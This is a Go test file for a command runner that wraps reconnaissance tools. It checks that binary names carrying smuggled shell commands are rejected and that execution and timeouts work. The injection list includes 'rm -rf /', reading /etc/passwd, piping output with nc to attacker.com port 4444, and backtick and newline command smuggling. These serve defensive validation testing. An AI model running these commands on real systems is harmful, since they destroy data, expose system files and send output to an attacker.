package runner

import (
	"context"
	"strings"
	"testing"
	"time"
)

func TestSafeRunnerInvalidBinaryInjection(t *testing.T) {
	sr := NewSafeRunner(5*time.Second, 128)

	dangerousBinaries := []string{
		"subfinder; rm -rf /",
		"httpx && cat /etc/passwd",
		"nmap | nc attacker.com 4444",
		"nuclei `id`",
		"test\nwhoami",
	}

	for _, bin := range dangerousBinaries {
		_, err := sr.ValidateBinary(bin)
		if err == nil {
			t.Errorf("expected error for injected binary name %q, got nil", bin)
		}
	}
}

func TestSafeRunnerExecuteGoVersion(t *testing.T) {
	sr := NewSafeRunner(10*time.Second, 128)

	var lines []string
	cfg := ExecutionConfig{
		Binary:  "go",
		Args:    []string{"version"},
		Timeout: 5 * time.Second,
		OnStdoutLine: func(line string) {
			lines = append(lines, line)
		},
	}

	res, err := sr.Run(context.Background(), cfg)
	if err != nil {
		t.Fatalf("expected successful execution of 'go version', got error: %v", err)
	}

	if res.ExitCode != 0 {
		t.Fatalf("expected exit code 0, got %d", res.ExitCode)
	}

	output := string(res.Stdout)
	if !strings.Contains(output, "go version") {
		t.Fatalf("expected 'go version' in output, got: %s", output)
	}

	if len(lines) == 0 {
		t.Fatalf("expected at least one line captured via OnStdoutLine callback")
	}
}

func TestSafeRunnerTimeout(t *testing.T) {
	sr := NewSafeRunner(1*time.Second, 128)

	// Go tool with sleep or long execution
	cfg := ExecutionConfig{
		Binary:  "go",
		Args:    []string{"help", "build"},
		Timeout: 1 * time.Nanosecond, // Immediate timeout
	}

	res, err := sr.Run(context.Background(), cfg)
	if err == nil && res.ExitCode == 0 {
		t.Fatalf("expected timeout error, got nil")
	}
}

